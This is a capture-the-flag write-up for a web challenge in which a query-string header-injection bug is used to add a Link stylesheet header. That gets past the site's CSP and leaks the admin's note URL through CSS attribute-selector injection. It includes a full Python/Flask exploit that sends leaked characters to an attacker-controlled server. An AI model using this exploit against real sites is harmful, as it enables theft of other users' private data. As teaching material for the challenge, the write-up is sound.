**This is almost same as [this blog article by the challenge author](https://diary.shift-js.info).**

## Flag Location

Looking at the source code, you'll soon find the flag exists in environment variables of `app` service.

```yaml
app:
  build: ./src/app
  restart: always
  ports:
    - "8080:8080"
  environment:
    - FLAG=TSGCTF{DUMMY_FLAG_DO_NOT_SUBMIT_THIS}
    - ADMIN_UID=dummydummydummydummydummydummydummyd
```

Then `app` will store the value of it into internal datastore as follows, where `ADMIN_UID` is session ID `worker` uses:

```go
	posts := []Post{}
	db.Where("uid = ?", os.Getenv("ADMIN_UID")).Find(&posts)
	if len(posts) == 0 {
		db.Create(&Post{
			UID:         os.Getenv("ADMIN_UID"),
			Title:       "flag",
			Description: os.Getenv("FLAG"),
		})
	}
```

We can access to the record once we get the URL for this like (`http://localhost:8080/notes/<blahblah>`). The goal of this challenge is **to leak the URL for this record**.

## Vulnerability

With a closer look at the implementation of `app`, you will find the following middleware allows to inject just a single HTTP response header through query strings for all endpoints:

```go
	r.Use(func(c *gin.Context) {
		k := c.Query("k")
		v := c.Query("v")
		if matched, err := regexp.MatchString("^[a-zA-Z-]+$", k); matched && err == nil && v != "" {
			c.Header(k, v)
		}
		c.Next()
	})
```

To put it more simply, this challenge is: **"Can you steal another user's secrets using a vulnerability that allows you to inject _just a single HTTP response header_?"**

## Intended Solution

Considering that who knows the URL of a note with the flag is `worker`, we need to abuse the vulnerability to control the behaviour of `worker`. This is not trivial since the vulnerability is not kinda XSS. **However, here comes a `Link` header!**

### Link Header

[Web Linking](https://datatracker.ietf.org/doc/html/rfc8288) specification defines `Link` header, which and behaves almost the same as `<link>` tag in HTML, although it is supported only by Firefox as of now. For example, in Firefox, the following response header loads `/foo.css` as a stylesheet as `<link rel="stylesheet" href="/foo.css">` does:

```
Link: </foo.css>; rel="stylesheet"; type="text/css"
```

Suppose that you can inject arbitrary header to a response through query params, you can inject arbitrary CSS to an arbitrary page of `app`! Once you can inject a CSS into the `/`, which shows the URLs of one's notes as follows, you can leak them with classical techniques of CSS Injection:

```html
<li><a href="/notes/nxwoufD9Lk">aa</a></li>
```

Note that you can make `worker` access any page of `app` with `/tell` endpoint with any query params.

### CSP Bypass

All responses from `app` are served with the following `Content-Security-Policy` header, preventing us from loading cross-origin stylesheets:

```go
	r.Use(func(c *gin.Context) {
		c.Header("Content-Security-Policy", "script-src 'self'; style-src 'self'; base-uri 'none'")
		c.Next()
	})
```

It means that we need to bypass this CSP to inject CSS successfully. However, You'll know this is trivial since `style-src` is `'self'` and you can create a resource with arbitrary string by using `POST /notes`. In detail, you can bypass CSP by (1) creating a note with css strings to inject and (2) using the note in `Link` header value as follows:

```
http://localhost:8080/?k=Link&v=%3C%2F(<URL of a note with styles to inject>)%3E%3B%20rel%3D%22stylesheet%22%3B%20type%3D%22text%2Fcss%22
```

### Example Exploit

Here's an example exploit:

```python
from flask import Flask, request
import requests
import urllib.parse
import string

# URL base to attack
TARGET_BASE = "http://localhost:8080"

# URL base of this python app visible from the challenge server
EXPLOIT_BASE_ADDR = "http://host.docker.internal:1337"

LEAK_LENGTH = 10
CHAR_CANDIDATES = string.ascii_letters + string.digits

app = Flask(__name__)
s = requests.Session()

def build_payload(prefix: str, candidates: "List[str]"):
    global EXPLOIT_BASE_ADDR
    assert EXPLOIT_BASE_ADDR != "", "EXPLOIT_BASE_ADDR is not set"

    payload = "{}"
    for candidate in candidates:
        id_prefix_to_try = prefix + candidate
        matcher = ''.join(map(lambda x: '\\' + hex(ord(x))
                              [2:], '/notes/' + id_prefix_to_try))
		payload += "a[href^=" + matcher + \
            "] { background-image: url(" + EXPLOIT_BASE_ADDR + \
            "/leak?q=" + urllib.parse.quote(id_prefix_to_try) + "); }"
    return payload


def post_note(title: str, description: str) -> str:
    r = s.post(TARGET_BASE + "/notes", data={
        "title": title,
        "description": description,
    }, headers={
        "content-type": "application/x-www-form-urlencoded"
    }, allow_redirects=False)
    assert r.status_code == 302, "invalid status code: {}".format(
        r.status_code)
    return r.headers['Location'].split('/notes/')[-1]


def report_note_as_stylesheet(id: str) -> None:
    header_value = '</notes/{}>; rel="stylesheet"; type="text/css"'.format(id)
    r = s.post(TARGET_BASE + "/tell", data={
        "path": "/?k=Link&v={}".format(urllib.parse.quote(header_value)),
    }, allow_redirects=False)
    assert r.status_code == 302, "invalid status code: {}".format(
        r.status_code)
    return None


@app.route("/start")
def start():
    p = build_payload("", CHAR_CANDIDATES)
    exploit_id = post_note("exploit", p)
    report_note_as_stylesheet(exploit_id)
    print("[info]: started exploit with a new note: {}/notes/{}".format(TARGET_BASE, exploit_id))
    return ""


@app.route("/leak")
def leak():
    leaked_id = request.args.get('q')
    if len(leaked_id) == LEAK_LENGTH:
        print("[+] leaked (full ID): {}".format(leaked_id))
        r = s.get(TARGET_BASE + "/notes/" + leaked_id)
        print(r.text)
    else:
        print("[info] leaked: {}{}".format(
            leaked_id, "*" * (LEAK_LENGTH - len(leaked_id))))

        p = build_payload(leaked_id, CHAR_CANDIDATES)
        exploit_id = post_note("exploit", p)
        report_note_as_stylesheet(exploit_id)
        print("[info]: invoked crawler with a new note: " + exploit_id)
    return ""


if __name__ == "__main__":
    print("[info] running app ...")
    app.run(host="0.0.0.0", port=1337)
```

When you are running the distributed app locally, you can run this exploit code for the app by running `python <path/to/code> && curl http://localhost:1337/start`. Note that you may need to change the definition of `worker` service as follows:

```yaml
worker:
  build: ./src/worker
  depends_on:
    - redis
  restart: always
  environment:
    - ADMIN_UID=dummydummydummydummydummydummydummyd
  extra_hosts:
    - "host.docker.internal:host-gateway"
```
